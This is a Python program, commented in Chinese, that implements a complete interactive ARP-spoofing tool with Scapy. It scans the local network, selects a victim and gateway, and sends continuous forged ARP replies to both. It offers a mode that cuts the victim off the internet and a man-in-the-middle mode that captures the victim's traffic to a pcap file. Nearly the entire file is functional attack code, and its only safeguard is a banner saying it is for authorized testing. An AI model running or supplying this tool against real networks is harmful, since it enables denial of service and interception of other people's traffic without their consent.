# ARP欺骗工具 - 优化版本   13 的改善
from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap, ICMP, IP)
from scapy.layers.inet import TCP, UDP
import os
import sys
import time
import platform
import subprocess
import re
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import ipaddress
import locale
import signal

class NetworkToolkit:
    def __init__(self):
        self.setup_encoding()
        self.setup_signal_handlers()
        self.running = False
        
    def setup_encoding(self):
        """设置全局编码以避免子进程编码错误"""
        os.environ['PYTHONIOENCODING'] = 'utf-8'
        
        if hasattr(sys.stdout, 'reconfigure'):
            try:
                sys.stdout.reconfigure(encoding='utf-8')
            except:
                pass
        if hasattr(sys.stderr, 'reconfigure'):
            try:
                sys.stderr.reconfigure(encoding='utf-8')
            except:
                pass
        
        if platform.system() == "Windows":
            try:
                os.system('chcp 65001 > nul 2>&1')
            except:
                pass

    def setup_signal_handlers(self):
        """设置信号处理器"""
        def signal_handler(sig, frame):
            print(f"\n🛑 接收到信号 {sig}，正在安全退出...")
            self.running = False
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)

    def safe_subprocess_run(self, cmd, shell=True):
        """安全的子进程执行函数"""
        try:
            result = subprocess.run(cmd, shell=shell, 
                                  capture_output=True, text=True,
                                  encoding='utf-8', errors='ignore')
            return result
        except Exception as e:
            print(f"子进程执行错误: {e}")
            return None

    def is_admin(self):
        """检查是否具有管理员权限"""
        try:
            if platform.system() == "Windows":
                from ctypes import windll
                return windll.shell32.IsUserAnAdmin()
            else:
                return os.getuid() == 0
        except:
            return False

    def get_mac(self, ip, interface=None):
        """获取IP地址的MAC地址"""
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            if interface:
                answered_list = srp(arp_request_broadcast, timeout=3, 
                                  iface=interface, verbose=False)[0]
            else:
                answered_list = srp(arp_request_broadcast, timeout=3, 
                                  verbose=False)[0]
            
            if answered_list:
                for sent, received in answered_list:
                    return received.hwsrc
            else:
                print(f"⚠️  无法获取 {ip} 的MAC地址")
                return None
                
        except Exception as e:
            print(f"❌ 获取 {ip} 的MAC地址时出错: {e}")
            return None

    def enable_ip_forwarding(self, enable, interface=None):
        """启用或禁用IP转发"""
        try:
            if platform.system() == "Linux":
                value = "1" if enable else "0"
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write(value)
                print(f"✅ Linux IP转发已{'启用' if enable else '禁用'}")
                return True
                
            elif platform.system() == "Windows":
                if interface is None:
                    interface = conf.iface if hasattr(conf, 'iface') else "以太网"
                
                interface_cleaned = interface.strip('"')
                
                if enable:
                    # 启用IP转发
                    cmds = [
                        f'netsh interface ipv4 set interface "{interface_cleaned}" forwarding=enabled',
                        "netsh interface ipv4 set global forwarding=enabled"
                    ]
                else:
                    # 禁用IP转发
                    cmds = [
                        f'netsh interface ipv4 set interface "{interface_cleaned}" forwarding=disabled',
                        "netsh interface ipv4 set global forwarding=disabled"
                    ]
                
                success = True
                for cmd in cmds:
                    result = self.safe_subprocess_run(cmd)
                    if result and result.returncode != 0:
                        success = False
                
                if success:
                    print(f"✅ Windows IP转发已{'启用' if enable else '禁用'}")
                else:
                    print(f"⚠️  Windows IP转发设置可能不完整")
                
                return success
                
        except Exception as e:
            print(f"❌ 设置IP转发时出错: {e}")
            return False

    def get_default_gateway(self):
        """获取默认网关"""
        print("🔄 正在检测网关...")
        
        try:
            if platform.system() == "Windows":
                # Windows系统
                gateways = []
                
                # 方法1: route print
                result = self.safe_subprocess_run("route print -4")
                if result and result.returncode == 0:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if "0.0.0.0" in line and len(line.split()) >= 3:
                            parts = line.split()
                            gateway = parts[2]
                            if re.match(r'\d+\.\d+\.\d+\.\d+', gateway):
                                gateways.append(gateway)
                
                # 方法2: ipconfig
                result = self.safe_subprocess_run("ipconfig")
                if result and result.returncode == 0:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if "默认网关" in line or "Default Gateway" in line:
                            gateway = line.split(':')[-1].strip()
                            if re.match(r'\d+\.\d+\.\d+\.\d+', gateway):
                                gateways.append(gateway)
                
                # 去重
                unique_gateways = []
                for gateway in gateways:
                    if gateway not in unique_gateways:
                        unique_gateways.append(gateway)
                
                return unique_gateways
                
            else:
                # Linux系统
                gateways = []
                
                # 方法1: ip route
                result = self.safe_subprocess_run("ip route | grep default")
                if result and result.returncode == 0:
                    match = re.search(r'default via (\d+\.\d+\.\d+\.\d+)', result.stdout)
                    if match:
                        gateways.append(match.group(1))
                
                return gateways
                
        except Exception as e:
            print(f"获取网关时出错: {e}")
            return []

    def get_windows_interfaces(self):
        """获取Windows网络接口"""
        interfaces = []
        try:
            from scapy.arch.windows import get_windows_if_list
            raw_interfaces = get_windows_if_list()
            
            for iface in raw_interfaces:
                interface_info = {
                    'name': iface['name'],
                    'description': iface.get('description', 'N/A'),
                    'mac': iface.get('mac', '00:00:00:00:00:00'),
                    'ips': iface.get('ips', [])
                }
                interfaces.append(interface_info)
                
        except Exception as e:
            print(f"获取接口列表失败: {e}")
            
        return interfaces

    def select_interface(self):
        """选择网络接口"""
        if platform.system() == "Windows":
            interfaces = self.get_windows_interfaces()
            if not interfaces:
                print("❌ 未找到可用的网络接口")
                return None
                
            print("\n请选择网络接口:")
            for i, iface in enumerate(interfaces):
                print(f"{i+1}. {iface['name']} - {iface['description']}")
            
            try:
                choice = int(input("输入序号 (默认1): ") or 1) - 1
                if 0 <= choice < len(interfaces):
                    selected = interfaces[choice]['name']
                    print(f"✅ 已选择接口: {selected}")
                    return selected
                else:
                    return interfaces[0]['name'] if interfaces else None
            except:
                return interfaces[0]['name'] if interfaces else None
        else:
            return None

    def scan_network(self, interface=None, netmask="24"):
        """扫描局域网设备"""
        local_ip = self.get_local_ip(interface)
        if not local_ip:
            print("❌ 无法获取本机IP地址")
            return []
        
        print(f"🔍 开始扫描局域网 {local_ip}/{netmask}...")
        
        # 生成IP范围
        try:
            network = ipaddress.IPv4Network(f"{local_ip}/{netmask}", strict=False)
            target_ips = [str(ip) for ip in network.hosts()]
        except Exception as e:
            print(f"计算网段范围时出错: {e}")
            return []
        
        discovered_hosts = []
        lock = threading.Lock()
        
        def scan_single_ip(ip):
            try:
                result = self.arp_scan(ip, interface)
                if result:
                    with lock:
                        discovered_hosts.append(result)
                return result
            except:
                return None
        
        # 使用线程池扫描
        max_workers = 20 if platform.system() == "Windows" else 50
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(scan_single_ip, ip): ip for ip in target_ips}
            
            completed = 0
            for future in as_completed(futures):
                completed += 1
                if completed % 20 == 0:
                    progress = (completed / len(target_ips)) * 100
                    print(f"\r进度: {completed}/{len(target_ips)} ({progress:.1f}%)", end="")
        
        print(f"\n✅ 扫描完成: 发现 {len(discovered_hosts)} 个设备")
        return discovered_hosts

    def arp_scan(self, target_ip, interface=None):
        """ARP扫描单个IP"""
        try:
            arp_request = ARP(pdst=target_ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            if interface:
                answered = srp(arp_request_broadcast, timeout=1, 
                             iface=interface, verbose=False)[0]
            else:
                answered = srp(arp_request_broadcast, timeout=1, 
                             verbose=False)[0]
            
            if answered:
                for sent, received in answered:
                    return {
                        'ip': received.psrc,
                        'mac': received.hwsrc,
                        'type': 'ARP'
                    }
        except:
            pass
        return None

    def get_local_ip(self, interface=None):
        """获取本机IP地址"""
        try:
            if interface and platform.system() == "Windows":
                from scapy.arch.windows import get_windows_if_list
                ifaces = get_windows_if_list()
                for iface in ifaces:
                    if iface['name'] == interface and iface.get('ips'):
                        return iface['ips'][0]
            else:
                return conf.iface.ip
        except:
            pass
        return None

    def display_hosts(self, hosts):
        """显示发现的设备"""
        if not hosts:
            print("❌ 未发现任何设备")
            return
        
        print("\n" + "="*50)
        print("📋 发现的设备列表:")
        print("="*50)
        
        hosts.sort(key=lambda x: [int(octet) for octet in x['ip'].split('.')])
        
        for i, host in enumerate(hosts, 1):
            print(f"{i:2d}. IP: {host['ip']:15s} | MAC: {host.get('mac', '未知'):17s}")
        
        print("="*50)

    def test_windows_compatibility(self):
        """测试Windows环境兼容性"""
        if not self.is_admin():
            print("❌ 请以管理员身份运行此程序")
            return False
        
        try:
            from scapy.all import conf
            print("✅ Scapy导入正常")
        except ImportError as e:
            print(f"❌ Scapy未正确安装: {e}")
            return False
        
        try:
            if platform.system() == "Windows":
                from scapy.arch.windows import get_windows_if_list
                ifaces = get_windows_if_list()
                if ifaces:
                    print("✅ 网络驱动正常")
                else:
                    print("❌ 未找到网络接口")
                    return False
        except Exception as e:
            print(f"❌ 网络驱动问题: {e}")
            return False
        
        return True

class ARPSpoofer:
    def __init__(self, victim, gateway, interface=None, block_internet=True):
        self.victim = victim
        self.gateway = gateway
        self.interface = interface
        self.block_internet = block_internet
        
        self.victimmac = None
        self.gatewaymac = None
        self.running = False
        
        # 初始化配置
        self.initialize()
    
    def initialize(self):
        """初始化ARP欺骗器"""
        # 检查权限
        toolkit = NetworkToolkit()
        if not toolkit.is_admin():
            raise Exception("需要管理员权限运行此程序")
        
        # Windows兼容性检查
        if platform.system() == "Windows" and not toolkit.test_windows_compatibility():
            raise Exception("Windows环境兼容性检查失败")
        
        # 设置接口
        if self.interface:
            conf.iface = self.interface
        
        # 获取MAC地址
        print("📡 正在获取MAC地址...")
        self.victimmac = toolkit.get_mac(self.victim, self.interface)
        self.gatewaymac = toolkit.get_mac(self.gateway, self.interface)
        
        if not self.victimmac:
            raise Exception(f"无法获取目标 {self.victim} 的MAC地址")
        if not self.gatewaymac:
            raise Exception(f"无法获取网关 {self.gateway} 的MAC地址")
        
        # 设置IP转发
        toolkit.enable_ip_forwarding(not self.block_internet, self.interface)
        
        print(f"✅ ARP欺骗器初始化完成")
        print(f"🎯 目标: {self.victim} ({self.victimmac})")
        print(f"🌐 网关: {self.gateway} ({self.gatewaymac})")
        print(f"🔧 模式: {'断网攻击' if self.block_internet else '中间人攻击'}")
    
    def start(self):
        """启动ARP欺骗"""
        self.running = True
        
        # 启动毒化线程
        poison_thread = threading.Thread(target=self.poison_loop)
        poison_thread.daemon = True
        poison_thread.start()
        
        # 如果不是断网模式，启动嗅探线程
        if not self.block_internet:
            sniff_thread = threading.Thread(target=self.sniff_loop)
            sniff_thread.daemon = True
            sniff_thread.start()
        
        print("✅ ARP欺骗已启动，按Ctrl+C停止")
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
    
    def poison_loop(self):
        """ARP毒化循环"""
        packet_count = 0
        
        # 获取本机MAC
        if self.interface:
            my_mac = get_if_hwaddr(self.interface)
        else:
            my_mac = get_if_hwaddr(conf.iface)
        
        while self.running:
            try:
                # 毒化目标：让目标认为我们是网关
                poison_victim = Ether(src=my_mac, dst=self.victimmac) / ARP(
                    op=2,
                    psrc=self.gateway,
                    pdst=self.victim,
                    hwsrc=my_mac,
                    hwdst=self.victimmac
                )
                
                # 毒化网关：让网关认为我们是目标
                poison_gateway = Ether(src=my_mac, dst=self.gatewaymac) / ARP(
                    op=2,
                    psrc=self.victim,
                    pdst=self.gateway,
                    hwsrc=my_mac,
                    hwdst=self.gatewaymac
                )
                
                send(poison_victim, verbose=False)
                send(poison_gateway, verbose=False)
                
                packet_count += 2
                if packet_count % 10 == 0:
                    mode = "🚫[断网]" if self.block_internet else "👁️[嗅探]"
                    print(f"\r{mode} 已发送ARP包: {packet_count}", end="")
                
                time.sleep(2)
                
            except Exception as e:
                if self.running:  # 只在运行状态下显示错误
                    print(f"\n发送ARP包时出错: {e}")
                time.sleep(1)
    
    def sniff_loop(self):
        """嗅探循环（中间人模式）"""
        time.sleep(5)  # 等待ARP毒化生效
        print("👃 开始嗅探网络流量...")
        
        try:
            bpf_filter = f"ip host {self.victim}"
            packets = sniff(filter=bpf_filter, iface=self.interface, 
                          count=100, store=True)
            
            filename = f"captured_{int(time.time())}.pcap"
            wrpcap(filename, packets)
            print(f"💾 捕获的数据包已保存到: {filename}")
            
        except Exception as e:
            print(f"嗅探时出错: {e}")
    
    def stop(self):
        """停止ARP欺骗"""
        self.running = False
        print("\n🛑 正在停止ARP欺骗...")
        
        # 恢复ARP表
        self.restore_arp()
        
        # 恢复IP转发
        toolkit = NetworkToolkit()
        toolkit.enable_ip_forwarding(False, self.interface)
        
        print("✅ ARP欺骗已停止")
    
    def restore_arp(self):
        """恢复ARP表"""
        print("🔄 正在恢复ARP表...")
        
        try:
            # 恢复目标ARP表
            restore_victim = Ether(dst=self.victimmac) / ARP(
                op=2,
                psrc=self.gateway,
                hwsrc=self.gatewaymac,
                pdst=self.victim,
                hwdst=self.victimmac
            )
            
            # 恢复网关ARP表
            restore_gateway = Ether(dst=self.gatewaymac) / ARP(
                op=2,
                psrc=self.victim,
                hwsrc=self.victimmac,
                pdst=self.gateway,
                hwdst=self.gatewaymac
            )
            
            # 发送多个恢复包
            for i in range(5):
                send(restore_victim, verbose=False)
                send(restore_gateway, verbose=False)
                time.sleep(0.5)
            
            print("✅ ARP表已恢复")
        except Exception as e:
            print(f"恢复ARP表时出错: {e}")

def network_scanner_mode():
    """网络扫描器模式"""
    toolkit = NetworkToolkit()
    
    print("\n🎯 网络扫描器模式")
    print("="*50)
    
    # 选择接口
    interface = toolkit.select_interface()
    if not interface:
        return
    
    # 扫描网络
    hosts = toolkit.scan_network(interface)
    toolkit.display_hosts(hosts)
    
    # 保存结果
    try:
        save = input("\n是否保存结果到文件? (y/N): ").strip().lower()
        if save == 'y':
            filename = f"network_scan_{int(time.time())}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("网络扫描结果\n")
                f.write(f"扫描时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"发现设备: {len(hosts)} 个\n\n")
                
                for i, host in enumerate(hosts, 1):
                    f.write(f"{i:2d}. IP: {host['ip']:15s} | MAC: {host.get('mac', '未知')}\n")
            
            print(f"✅ 结果已保存到: {filename}")
    except KeyboardInterrupt:
        pass

def arp_spoofer_mode():
    """ARP欺骗器模式"""
    toolkit = NetworkToolkit()
    
    print("\n🦠 ARP欺骗工具")
    print("="*50)
    
    # 检查环境
    if platform.system() == "Windows" and not toolkit.test_windows_compatibility():
        return
    
    # 选择接口
    interface = toolkit.select_interface()
    if not interface:
        return
    
    # 获取本机IP和网关
    local_ip = toolkit.get_local_ip(interface)
    gateways = toolkit.get_default_gateway()
    
    print(f"\n📊 网络信息:")
    print(f"   本机IP: {local_ip}")
    print(f"   发现网关: {', '.join(gateways) if gateways else '无'}")
    
    # 选择目标IP
    print("\n🎯 选择目标IP:")
    print("1. 扫描网络并选择")
    print("2. 手动输入IP")
    
    try:
        choice = input("请选择 (默认1): ").strip() or "1"
        
        if choice == "1":
            hosts = toolkit.scan_network(interface)
            if not hosts:
                print("❌ 未发现设备，请手动输入IP")
                return
            
            toolkit.display_hosts(hosts)
            target_ip = input("请输入目标IP地址: ").strip()
        else:
            target_ip = input("请输入目标IP地址: ").strip()
        
        if not target_ip:
            print("❌ 未输入目标IP")
            return
        
        # 验证目标IP
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            print("❌ 无效的IP地址")
            return
        
        # 测试目标连通性
        target_mac = toolkit.get_mac(target_ip, interface)
        if not target_mac:
            print(f"❌ 无法连接到目标 {target_ip}")
            return
        
        # 选择网关
        if gateways:
            print(f"\n🌐 选择网关:")
            for i, gateway in enumerate(gateways, 1):
                print(f"{i}. {gateway}")
            print(f"{len(gateways)+1}. 手动输入网关")
            
            choice = input(f"请选择 (默认1): ").strip() or "1"
            
            if choice.isdigit() and 1 <= int(choice) <= len(gateways):
                gateway_ip = gateways[int(choice)-1]
            else:
                gateway_ip = input("请输入网关IP: ").strip()
        else:
            gateway_ip = input("请输入网关IP: ").strip()
        
        if not gateway_ip:
            print("❌ 未输入网关IP")
            return
        
        # 验证网关
        gateway_mac = toolkit.get_mac(gateway_ip, interface)
        if not gateway_mac:
            print(f"❌ 无法连接到网关 {gateway_ip}")
            return
        
        # 选择模式
        print("\n🔧 选择攻击模式:")
        print("1. 断网攻击 (目标无法上网)")
        print("2. 中间人攻击 (嗅探流量)")
        
        choice = input("请选择 (默认1): ").strip() or "1"
        block_internet = (choice != "2")
        
        # 确认信息
        print(f"\n📋 攻击配置:")
        print(f"   目标: {target_ip} ({target_mac})")
        print(f"   网关: {gateway_ip} ({gateway_mac})")
        print(f"   模式: {'断网攻击' if block_internet else '中间人攻击'}")
        
        confirm = input("\n确认开始攻击? (y/N): ").strip().lower()
        if confirm != 'y':
            print("❌ 用户取消操作")
            return
        
        # 启动ARP欺骗
        spoofer = ARPSpoofer(
            victim=target_ip,
            gateway=gateway_ip,
            interface=interface,
            block_internet=block_internet
        )
        
        spoofer.start()
        
    except KeyboardInterrupt:
        print("\n❌ 用户取消操作")
    except Exception as e:
        print(f"❌ 错误: {e}")

def main():
    """主函数"""
    toolkit = NetworkToolkit()
    
    print("🛠️  网络工具集 - 仅用于授权测试")
    print(f"💻 系统: {platform.system()} {platform.release()}")
    print("="*50)
    
    # 检查权限
    if not toolkit.is_admin():
        print("❌ 请以管理员身份运行此程序!")
        input("按回车键退出...")
        return
    
    toolkit.running = True
    
    while toolkit.running:
        print("\n请选择功能:")
        print("1. 🎯 网络设备扫描器")
        print("2. 🦠 ARP欺骗工具") 
        print("3. 🚪 退出")
        
        try:
            choice = input("输入选择 (默认1): ").strip() or "1"
            
            if choice == "1":
                network_scanner_mode()
            elif choice == "2":
                arp_spoofer_mode()
            elif choice == "3":
                print("👋 再见!")
                toolkit.running = False
            else:
                print("❌ 无效选择")
                
        except KeyboardInterrupt:
            print("\n👋 再见!")
            toolkit.running = False

if __name__ == "__main__":
    main()